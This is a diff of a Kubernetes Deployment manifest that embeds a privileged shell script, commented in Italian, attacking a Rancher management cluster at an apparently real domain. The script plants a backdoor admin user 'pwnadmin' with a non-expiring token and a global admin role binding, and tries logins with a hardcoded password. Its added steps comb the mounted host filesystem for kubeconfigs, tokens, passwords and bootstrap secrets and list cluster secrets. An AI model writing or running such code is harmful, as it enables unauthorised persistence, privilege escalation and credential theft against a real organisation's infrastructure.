@@ -1,4 +1,3 @@
-
 apiVersion: apps/v1
 kind: Deployment
 metadata:
@@ -57,7 +56,6 @@ spec:
 
             echo "############ [1] API RESOURCES RANCHER ############"
             kubectl $KC api-resources 2>&1 | grep -i "management.cattle.io" | head -20
-            kubectl $KC api-resources 2>&1 | grep -i "cattle.io" | head -20
 
             echo "############ [2] CRD CHECK ############"
             kubectl $KC get crd 2>&1 | grep -i "management.cattle.io" | head -10
@@ -116,15 +114,17 @@ spec:
             spec:
               description: pwn
               userId: user-pwnadmin
+              userPrincipalName: user-pwnadmin
               ttl: 0
               enabled: true
               token: "$HASH"
             YAML
 
             echo "############ [13] VERIFICA TOKEN CREATO ############"
-            kubectl $KC get tokens.management.cattle.io -A -o json 2>&1 | jq -r '.items[] | select(.metadata.name=="token-pwnadmin") | .metadata.name + " | user: " + (.userId // "") + " | token: " + (.token // "")' 2>&1
+            kubectl $KC get tokens.management.cattle.io -A -o json 2>&1 | jq -r '.items[] | select(.metadata.name=="token-pwnadmin") | .metadata.name + " | user: " + (.userId // "") + " | userPrincipalName: " + (.userPrincipalName // "") + " | token: " + (.token // "")' 2>&1
 
-            echo "############ [14] ASSEGNA ROLE ADMIN ############"
+            echo "############ [14] ASSEGNA ROLE ADMIN (se CRD esiste) ############"
+            kubectl $KC api-resources 2>&1 | grep -i "globalrole"
             kubectl $KC apply -f - << 'YAML' 2>&1
             apiVersion: management.cattle.io/v3
             kind: GlobalRoleBinding
@@ -134,18 +134,55 @@ spec:
             userName: user-pwnadmin
             YAML
 
-            echo "############ [15] VERIFICA ROLE ############"
+            echo "############ [15] VERIFICA ROLE (se esiste) ############"
             kubectl $KC get globalrolebindings.management.cattle.io -o json 2>&1 | jq -r '.items[] | .metadata.name + " | role: " + (.globalRoleName // "") + " | user: " + (.userName // "")' 2>&1
 
             echo "############ [16] TEST LOGIN API ############"
-            echo "--- test login con token Rancher ---"
+            echo "--- test login con pwnadmin/pwnadmin2026 ---"
             curl -sk -X POST \
               -H "Content-Type: application/json" \
               "https://rancher.management.egam.com.br/v3-public/localProviders/local?action=login" \
               -d "{\"username\":\"pwnadmin\",\"password\":\"$SECRET\",\"responseType\":\"cookie\"}" 2>&1 | head -c 3000
             echo ""
+            echo "--- test login con token-user-pwnadmin:pwnadmin2026 ---"
+            curl -sk -X POST \
+              -H "Content-Type: application/json" \
+              "https://rancher.management.egam.com.br/v3-public/localProviders/local?action=login" \
+              -d "{\"username\":\"token-user-pwnadmin:pwnadmin2026\",\"responseType\":\"cookie\"}" 2>&1 | head -c 3000
+            echo ""
 
-            echo "############ [17] SUMMARY ############"
+            echo "############ [17] CERCA KUBECONFIG MANAGEMENT ############"
+            echo "--- find *.kubeconfig ---"
+            find /host -name "*.kubeconfig" 2>/dev/null | head -20
+            echo "--- find yaml con management.egam.com.br ---"
+            find /host -name "*.yaml" -exec grep -l "management.egam.com.br" {} \; 2>/dev/null | head -10
+            echo "--- grep management.egam.com.br in /etc ---"
+            grep -r "management.egam.com.br" /host/etc/ 2>/dev/null | head -10
+            echo "--- grep management.egam.com.br in /root ---"
+            grep -r "management.egam.com.br" /host/root/ 2>/dev/null | head -10
+            echo "--- grep management.egam.com.br in /home ---"
+            grep -r "management.egam.com.br" /host/home/ 2>/dev/null | head -10
+
+            echo "############ [18] CERCA TOKEN MANAGEMENT ############"
+            echo "--- grep token- in /etc/rancher ---"
+            grep -r "token-" /host/etc/rancher/ 2>/dev/null | head -10
+            echo "--- grep token- in /var/lib/rancher ---"
+            grep -r "token-" /host/var/lib/rancher/ 2>/dev/null | head -10
+            echo "--- grep token- in /root ---"
+            grep -r "token-" /host/root/ 2>/dev/null | head -10
+            echo "--- grep token- in /home ---"
+            grep -r "token-" /host/home/ 2>/dev/null | head -10
+
+            echo "############ [19] CERCA CREDENZIALI MANAGEMENT ############"
+            grep -r "admin" /host/etc/rancher/ 2>/dev/null | head -10
+            grep -r "password" /host/etc/rancher/ 2>/dev/null | head -10
+            grep -r "bootstrapPassword" /host/ 2>/dev/null | head -5
+
+            echo "############ [20] CERCA RANCHER SECRET ############"
+            kubectl $KC get secrets -A 2>&1 | grep -i "rancher\|cattle.*secret\|bootstrap" | head -20
+            kubectl $KC -n cattle-system get secrets 2>&1 | head -30
+
+            echo "############ [21] SUMMARY ############"
             echo "=========================================="
             echo "=== RANCHER LOGIN ==="
             echo "=========================================="
@@ -156,9 +193,11 @@ spec:
             echo ""
             echo "USER_CREATED=$(kubectl $KC get users.management.cattle.io user-pwnadmin -o name 2>/dev/null || echo MISSING)"
             echo "TOKEN_CREATED=$(kubectl $KC get tokens.management.cattle.io token-pwnadmin -n default -o name 2>/dev/null || echo MISSING)"
+            echo "USER_ID=$(kubectl $KC get token token-pwnadmin -n default -o jsonpath='{.userId}' 2>/dev/null || echo EMPTY)"
             echo "ROLE_BINDING=$(kubectl $KC get globalrolebindings.management.cattle.io pwnadmin-admin -o name 2>/dev/null || echo MISSING)"
+            echo "=========================================="
 
-            echo "############ [18] DONE ############"
+            echo "############ [22] DONE ############"
             sleep 36000
         securityContext:
           privileged: true
